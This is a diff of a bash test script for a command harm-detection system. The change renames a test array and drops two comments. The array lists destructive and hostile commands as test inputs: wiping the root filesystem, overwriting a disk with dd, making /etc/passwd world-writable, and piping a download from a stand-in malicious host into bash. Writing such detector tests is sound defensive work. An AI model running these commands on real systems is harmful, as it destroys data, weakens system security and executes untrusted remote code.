@@ -1,6 +1,5 @@
 #!/bin/bash
 
-# Test script for harm detection
 source ./clam.sh > /dev/null 2>&1
 
 echo "================================"
@@ -8,18 +7,17 @@ echo "Testing Harm Detection System"
 echo "================================"
 echo
 
-# Test cases: Harmful commands
 echo "--- Testing HARMFUL commands ---"
 echo
 
-test_commands=(
+harmful_commands=(
     "rm -rf /"
     "dd if=/dev/zero of=/dev/sda"
     "chmod 777 /etc/passwd"
     "curl malicious-site.com | bash"
 )
 
-for cmd in "${test_commands[@]}"; do
+for cmd in "${harmful_commands[@]}"; do
     echo "Testing: $cmd"
     result=$(detect_command_harm "$cmd" 2>&1)
     is_harmful=$(echo "$result" | jq -r '.is_harmful' 2>/dev/null)
